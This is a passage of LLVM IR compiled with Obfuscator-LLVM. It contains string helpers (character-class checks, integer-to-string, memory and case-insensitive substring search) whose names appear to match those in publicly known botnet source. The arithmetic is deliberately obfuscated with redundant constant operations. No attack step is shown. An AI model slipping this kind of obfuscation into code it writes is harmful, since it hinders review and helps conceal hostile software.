  %74 = sub i32 %73, 2086200043
  %75 = sub i32 %74, %72
  %76 = add i32 %75, 2086200043
  %77 = sub nsw i32 %73, %72
  store i32 %76, i32* %6, align 4
  br label %79

; <label>:78:                                     ; preds = %62
  br label %119

; <label>:79:                                     ; preds = %67
  br label %80

; <label>:80:                                     ; preds = %79, %56
  %81 = load i32, i32* %6, align 4
  %82 = load i32, i32* %4, align 4
  %83 = icmp sge i32 %81, %82
  br i1 %83, label %84, label %85

; <label>:84:                                     ; preds = %80
  br label %119

; <label>:85:                                     ; preds = %80
  %86 = load i32, i32* %9, align 4
  %87 = icmp slt i32 %86, 0
  br i1 %87, label %100, label %88

; <label>:88:                                     ; preds = %85
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp ugt i64 %89, %90
  br i1 %91, label %100, label %92

; <label>:92:                                     ; preds = %88
  %93 = load i64, i64* %5, align 8
  %94 = load i64, i64* %7, align 8
  %95 = icmp eq i64 %93, %94
  br i1 %95, label %96, label %101

; <label>:96:                                     ; preds = %92
  %97 = load i32, i32* %6, align 4
  %98 = load i32, i32* %10, align 4
  %99 = icmp sgt i32 %97, %98
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %96, %88, %85
  store i32 -1, i32* %9, align 4
  br label %113

; <label>:101:                                    ; preds = %96, %92
  store i32 1, i32* %9, align 4
  %102 = load i32, i32* %4, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = mul i64 %104, %103
  store i64 %105, i64* %5, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %5, align 8
  %109 = add i64 %108, 8954251045931632958
  %110 = add i64 %109, %107
  %111 = sub i64 %110, 8954251045931632958
  %112 = add i64 %108, %107
  store i64 %111, i64* %5, align 8
  br label %113

; <label>:113:                                    ; preds = %101, %100
  br label %114

; <label>:114:                                    ; preds = %113
  %115 = load i8*, i8** %3, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %3, align 8
  %117 = load i8, i8* %115, align 1
  %118 = sext i8 %117 to i32
  store i32 %118, i32* %6, align 4
  br label %51

; <label>:119:                                    ; preds = %84, %78
  %120 = load i32, i32* %9, align 4
  %121 = icmp slt i32 %120, 0
  br i1 %121, label %122, label %126

; <label>:122:                                    ; preds = %119
  %123 = load i32, i32* %8, align 4
  %124 = icmp ne i32 %123, 0
  %125 = select i1 %124, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %125, i64* %5, align 8
  br label %136

; <label>:126:                                    ; preds = %119
  %127 = load i32, i32* %8, align 4
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %135

; <label>:129:                                    ; preds = %126
  %130 = load i64, i64* %5, align 8
  %131 = sub i64 0, 4283285556392391747
  %132 = sub i64 %131, %130
  %133 = add i64 %132, 4283285556392391747
  %134 = sub i64 0, %130
  store i64 %133, i64* %5, align 8
  br label %135

; <label>:135:                                    ; preds = %129, %126
  br label %136

; <label>:136:                                    ; preds = %135, %122
  %137 = load i64, i64* %5, align 8
  %138 = trunc i64 %137 to i32
  ret i32 %138
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isspace(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %18, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %18, label %10

; <label>:10:                                     ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp eq i32 %16, 10
  br label %18

; <label>:18:                                     ; preds = %14, %10, %6, %1
  %19 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  ret i32 %20
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isdigit(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isalpha(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

; <label>:14:                                     ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

; <label>:18:                                     ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

; <label>:20:                                     ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isupper(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [34 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %7, align 8
  %14 = icmp eq i8* %13, null
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %3
  store i8* null, i8** %4, align 8
  br label %97

; <label>:16:                                     ; preds = %3
  %17 = load i32, i32* %5, align 4
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %90

; <label>:19:                                     ; preds = %16
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 32, i32* %10, align 4
  %20 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 33
  store i8 0, i8* %20, align 1
  %21 = load i32, i32* %6, align 4
  %22 = icmp eq i32 %21, 10
  br i1 %22, label %23, label %32

; <label>:23:                                     ; preds = %19
  %24 = load i32, i32* %5, align 4
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %32

; <label>:26:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %27 = load i32, i32* %5, align 4
  %28 = sub i32 0, 1519333724
  %29 = sub i32 %28, %27
  %30 = add i32 %29, 1519333724
  %31 = sub nsw i32 0, %27
  store i32 %30, i32* %12, align 4
  br label %34

; <label>:32:                                     ; preds = %23, %19
  store i32 0, i32* %9, align 4
  %33 = load i32, i32* %5, align 4
  store i32 %33, i32* %12, align 4
  br label %34

; <label>:34:                                     ; preds = %32, %26
  br label %35

; <label>:35:                                     ; preds = %58, %34
  %36 = load i32, i32* %12, align 4
  %37 = icmp ne i32 %36, 0
  br i1 %37, label %38, label %71

; <label>:38:                                     ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %6, align 4
  %41 = urem i32 %39, %40
  store i32 %41, i32* %11, align 4
  %42 = load i32, i32* %11, align 4
  %43 = icmp slt i32 %42, 10
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %38
  %45 = load i32, i32* %11, align 4
  %46 = sub i32 0, %45
  %47 = sub i32 0, 48
  %48 = add i32 %46, %47
  %49 = sub i32 0, %48
  %50 = add nsw i32 %45, 48
  store i32 %49, i32* %11, align 4
  br label %58

; <label>:51:                                     ; preds = %38
  %52 = load i32, i32* %11, align 4
  %53 = sub i32 0, %52
  %54 = sub i32 0, 55
  %55 = add i32 %53, %54
  %56 = sub i32 0, %55
  %57 = add nsw i32 %52, 55
  store i32 %56, i32* %11, align 4
  br label %58

; <label>:58:                                     ; preds = %51, %44
  %59 = load i32, i32* %11, align 4
  %60 = trunc i32 %59 to i8
  %61 = load i32, i32* %10, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %62
  store i8 %60, i8* %63, align 1
  %64 = load i32, i32* %6, align 4
  %65 = load i32, i32* %12, align 4
  %66 = udiv i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load i32, i32* %10, align 4
  %68 = sub i32 0, -1
  %69 = sub i32 %67, %68
  %70 = add nsw i32 %67, -1
  store i32 %69, i32* %10, align 4
  br label %35

; <label>:71:                                     ; preds = %35
  %72 = load i32, i32* %9, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %78

; <label>:74:                                     ; preds = %71
  %75 = load i32, i32* %10, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %76
  store i8 45, i8* %77, align 1
  br label %84

; <label>:78:                                     ; preds = %71
  %79 = load i32, i32* %10, align 4
  %80 = sub i32 %79, 778859249
  %81 = add i32 %80, 1
  %82 = add i32 %81, 778859249
  %83 = add nsw i32 %79, 1
  store i32 %82, i32* %10, align 4
  br label %84

; <label>:84:                                     ; preds = %78, %74
  %85 = load i8*, i8** %7, align 8
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %87
  %89 = call i32 @util_strcpy(i8* %85, i8* %88)
  br label %95

; <label>:90:                                     ; preds = %16
  %91 = load i8*, i8** %7, align 8
  %92 = getelementptr inbounds i8, i8* %91, i64 0
  store i8 48, i8* %92, align 1
  %93 = load i8*, i8** %7, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 1
  store i8 0, i8* %94, align 1
  br label %95

; <label>:95:                                     ; preds = %90, %84
  %96 = load i8*, i8** %7, align 8
  store i8* %96, i8** %4, align 8
  br label %97

; <label>:97:                                     ; preds = %95, %15
  %98 = load i8*, i8** %4, align 8
  ret i8* %98
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %57

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %50, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %56

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %48

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = sub i32 0, 1
  %38 = sub i32 %36, %37
  %39 = add nsw i32 %36, 1
  store i32 %38, i32* %11, align 4
  %40 = load i32, i32* %9, align 4
  %41 = icmp eq i32 %38, %40
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %35
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, 1
  %45 = sub i32 %43, %44
  %46 = add nsw i32 %43, 1
  store i32 %45, i32* %5, align 4
  br label %57

; <label>:47:                                     ; preds = %35
  br label %49

; <label>:48:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %49

; <label>:49:                                     ; preds = %48, %47
  br label %50

; <label>:50:                                     ; preds = %49
  %51 = load i32, i32* %10, align 4
  %52 = add i32 %51, 977876697
  %53 = add i32 %52, 1
  %54 = sub i32 %53, 977876697
  %55 = add nsw i32 %51, 1
  store i32 %54, i32* %10, align 4
  br label %17

; <label>:56:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %57

; <label>:57:                                     ; preds = %56, %42, %15
  %58 = load i32, i32* %5, align 4
  ret i32 %58
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_stristr(i8*, i32, i8*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

; <label>:16:                                     ; preds = %119, %3
  %17 = load i32, i32* %6, align 4
  %18 = sub i32 0, -1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, -1
  store i32 %19, i32* %6, align 4
  %21 = icmp sgt i32 %17, 0
  br i1 %21, label %22, label %120

; <label>:22:                                     ; preds = %16
  %23 = load i8*, i8** %8, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %8, align 8
  %25 = load i8, i8* %23, align 1
  store i8 %25, i8* %11, align 1
  %26 = load i8*, i8** %7, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  store i8 %30, i8* %12, align 1
  %31 = load i8, i8* %11, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp sge i32 %32, 65
  br i1 %33, label %34, label %57

; <label>:34:                                     ; preds = %22
  %35 = load i8, i8* %11, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp sle i32 %36, 90
  br i1 %37, label %38, label %57

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* %11, align 1
  %40 = sext i8 %39 to i32
  %41 = xor i32 %40, -1
  %42 = xor i32 96, -1
  %43 = xor i32 -743837096, -1
  %44 = and i32 %41, -743837096
  %45 = and i32 %40, %43
  %46 = and i32 %42, -743837096
  %47 = and i32 96, %43
  %48 = or i32 %44, %45
  %49 = or i32 %46, %47
  %50 = xor i32 %48, %49
  %51 = or i32 %41, %42
  %52 = xor i32 %51, -1
  %53 = or i32 -743837096, %43
  %54 = and i32 %52, %53
  %55 = or i32 %50, %54
  %56 = or i32 %40, 96
  br label %60

; <label>:57:                                     ; preds = %34, %22
  %58 = load i8, i8* %11, align 1
  %59 = sext i8 %58 to i32
  br label %60

; <label>:60:                                     ; preds = %57, %38
  %61 = phi i32 [ %55, %38 ], [ %59, %57 ]
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %11, align 1
  %63 = load i8, i8* %12, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp sge i32 %64, 65
  br i1 %65, label %66, label %89

; <label>:66:                                     ; preds = %60
  %67 = load i8, i8* %12, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp sle i32 %68, 90
  br i1 %69, label %70, label %89

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* %12, align 1
  %72 = sext i8 %71 to i32
  %73 = xor i32 %72, -1
  %74 = xor i32 96, -1
  %75 = xor i32 -97480713, -1
  %76 = and i32 %73, -97480713
  %77 = and i32 %72, %75
  %78 = and i32 %74, -97480713
  %79 = and i32 96, %75
  %80 = or i32 %76, %77
  %81 = or i32 %78, %79
  %82 = xor i32 %80, %81
  %83 = or i32 %73, %74
  %84 = xor i32 %83, -1
  %85 = or i32 -97480713, %75
  %86 = and i32 %84, %85
  %87 = or i32 %82, %86
  %88 = or i32 %72, 96
  br label %92

; <label>:89:                                     ; preds = %66, %60
  %90 = load i8, i8* %12, align 1
  %91 = sext i8 %90 to i32
  br label %92

; <label>:92:                                     ; preds = %89, %70
  %93 = phi i32 [ %87, %70 ], [ %91, %89 ]
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %12, align 1
  %95 = load i8, i8* %11, align 1
  %96 = sext i8 %95 to i32
  %97 = load i8, i8* %12, align 1
  %98 = sext i8 %97 to i32
  %99 = icmp eq i32 %96, %98
  br i1 %99, label %100, label %118

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = sub i32 %101, 1891177755
  %103 = add i32 %102, 1
  %104 = add i32 %103, 1891177755
  %105 = add nsw i32 %101, 1
  store i32 %104, i32* %10, align 4
  %106 = load i32, i32* %9, align 4
  %107 = icmp eq i32 %104, %106
  br i1 %107, label %108, label %117

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %8, align 8
  %110 = load i8*, i8** %5, align 8
  %111 = ptrtoint i8* %109 to i64
  %112 = ptrtoint i8* %110 to i64
  %113 = sub i64 0, %112
  %114 = add i64 %111, %113
  %115 = sub i64 %111, %112
  %116 = trunc i64 %114 to i32
  store i32 %116, i32* %4, align 4
  br label %121

; <label>:117:                                    ; preds = %100
  br label %119

; <label>:118:                                    ; preds = %92
  store i32 0, i32* %10, align 4
  br label %119

; <label>:119:                                    ; preds = %118, %117
  br label %16

; <label>:120:                                    ; preds = %16
  store i32 -1, i32* %4, align 4
  br label %121

; <label>:121:                                    ; preds = %120, %108
  %122 = load i32, i32* %4, align 4
  ret i32 %122
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846902}
!2 = !{i32 -2146846493}
